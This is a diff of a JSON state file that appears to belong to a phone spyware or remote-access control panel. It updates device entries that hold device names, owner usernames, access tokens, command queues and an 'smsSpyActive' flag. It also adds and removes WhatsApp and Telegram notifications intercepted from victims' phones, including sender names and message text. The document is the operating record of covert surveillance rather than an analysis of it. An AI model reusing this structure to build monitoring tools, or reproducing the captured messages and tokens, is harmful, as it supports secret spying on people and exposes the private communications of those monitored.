@@ -6313,7 +6313,7 @@
     "deviceName": "HP-AUBREY-899E",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "3cfe8ffe8872f32822087d633ebd4fe4",
-    "lastSeen": 1776778614074,
+    "lastSeen": 1776778616950,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:49:26.839Z",
@@ -10346,7 +10346,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776778614214,
+    "lastSeen": 1776778617204,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -10403,6 +10403,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "[ suendi ]",
+        "content": "Pesan baru dari 1 chat",
+        "time": "21/04 20:36",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776778618407
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "[ suendi ]",
+        "content": "Pesan baru dari 1 chat",
+        "time": "21/04 20:36",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776778617358
+      },
       {
         "appName": "WhatsApp",
         "sender": "[ suendi ]",
@@ -14386,22 +14402,6 @@
         "time": "21/04 20:27",
         "pkg": "org.telegram.messenger",
         "receivedAt": 1776778071416
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram",
-        "content": "Davii・5945 pesan baru dari 49 obrolan",
-        "time": "21/04 20:27",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776778071305
-      },
-      {
-        "appName": "Telegram",
-        "sender": "SEWA WA BY LIFESTYLE😈: Rose",
-        "content": "Hey there KING777, and welcome to SEWA WA BY LIFESTYLE😈! How are you?",
-        "time": "21/04 20:27",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776778070922
       }
     ],
     "galleryPhotos": [],
@@ -16688,7 +16688,7 @@
     "deviceName": "HP-VIP-DFF9",
     "ownerUsername": "kinzz",
     "token": "5d86b5519e1603f3456060c28a22c345",
-    "lastSeen": 1776778614293,
+    "lastSeen": 1776778617298,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T11:31:24.904Z",
